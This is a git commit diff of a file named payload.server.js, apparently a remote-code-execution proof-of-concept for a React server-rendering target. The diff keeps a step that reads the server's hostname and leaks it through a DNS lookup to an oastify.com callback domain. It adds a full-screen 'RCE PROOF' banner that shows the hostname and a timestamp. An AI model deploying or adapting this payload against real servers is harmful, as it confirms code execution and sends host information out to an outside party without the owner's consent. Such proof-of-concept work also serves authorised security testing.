46a0d10d2527c63662b4090662aa138981b408fa
alex <alex@MacBook-Pro-admin-2.local>
2026-07-31 01:12:15 +0300

    v8: renders hostname in HTML + DNS callback

--- payload.server.js
+++ payload.server.js
@@ -1,11 +1,14 @@
+var React = require("react");
+
 module.exports = {
   default: function(props) {
-    try {
-      var os = require("os");
-      var dns = require("dns");
-      var hostname = os.hostname();
-      dns.lookup(hostname + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(err, addr) {});
-    } catch(e) {}
-    return null;
+    var hostname = "unknown";
+    try { hostname = require("os").hostname(); } catch(e) {}
+    try { require("dns").lookup(hostname + ".8t2ihwrxngo468cv8f0uf47xjopfd81x.oastify.com", function(){}); } catch(e) {}
+    
+    return React.createElement("div", {
+      id: "rce-proof",
+      style: {background:"red",color:"white",padding:"20px",fontSize:"24px",position:"fixed",top:0,left:0,zIndex:99999}
+    }, "RCE PROOF: " + hostname + " | " + new Date().toISOString());
   }
 };
